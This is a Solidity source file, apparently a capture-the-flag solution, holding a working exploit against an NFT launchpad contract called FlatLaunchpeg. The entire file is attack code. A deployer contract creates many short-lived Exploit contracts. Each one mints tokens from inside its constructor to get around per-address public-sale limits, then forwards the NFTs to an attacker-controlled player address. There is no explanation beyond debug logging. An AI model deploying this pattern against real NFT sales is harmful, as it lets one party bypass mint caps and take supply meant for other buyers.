// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "hardhat/console.sol";

interface IFlatLaunchpeg {
    function publicSaleMint(uint256 _quantity)
        external
        payable;
    
    function balanceOf(address account) external view returns (uint256);

    function safeTransferFrom(address from, address to, uint tokenId) external returns (bool);
}

contract JpegSniperExploiter {
    constructor(address _flatLaunchpeg, address _player) public payable {
        // Create a for loop to instantiate the contract multiple times
        for (uint i = 0; i < 69;) {
            if (i<65) {
                console.log("i below 65: %s", i);
                new Exploit{value: 1}(_flatLaunchpeg, _player, i, i+4);
            } else {
                console.log("i above 65: %s", i);
                new Exploit{value: 1}(_flatLaunchpeg, _player, i, 68);
            }
            unchecked {
                i = i+5;
            }
        }
    }
}

contract Exploit {
    IFlatLaunchpeg public flatLaunchpeg;
    address player;

    constructor(address _flatLaunchpeg, address _player,  uint _startIndex, uint _endIndex) public payable {
        flatLaunchpeg = IFlatLaunchpeg(_flatLaunchpeg);
        player = _player;
        console.log("startIndex: %s, endIndex: %s", _startIndex, _endIndex);
        flatLaunchpeg.publicSaleMint(_endIndex-_startIndex+1);
        transfer(_startIndex, _endIndex);
    }
    
    function transfer(uint startIndex, uint256 endIndex) internal {
        for (uint i = startIndex; i <= endIndex;) {
            flatLaunchpeg.safeTransferFrom(address(this), player, i);
            unchecked {
                i = i+1;
            }
        }
    }

    receive() external payable {
    }
}